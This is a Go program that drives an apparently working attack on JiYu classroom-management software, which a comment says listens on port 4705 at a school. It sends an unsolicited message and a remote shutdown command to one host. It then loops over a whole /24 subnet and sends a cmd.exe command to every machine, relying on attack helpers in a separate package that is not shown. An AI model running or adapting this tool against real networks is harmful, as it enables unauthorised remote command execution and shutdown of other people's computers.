package main

import (
	"awesomeProject1/core"
	"strconv"
	"time"
)

func main() {
	// 示例使用
	targetIP := "192.168.1.100"
	targetPort := 4705 //学校极域默认监听端口

	// 发送消息
	core.JiYuSendMsg(targetIP, targetPort, "Hello from Go")

	// 发送关机命令
	core.JiYuSendShutdown(targetIP, targetPort)
	//	给所有主机发送命令
	for i := 1; i < 255; i++ {
		core.JiYuSendCmd("192.168.234."+strconv.Itoa(i), targetPort, "cmd.exe /c echo hello world")
		time.Sleep(1 * time.Second * 1)
	}
}
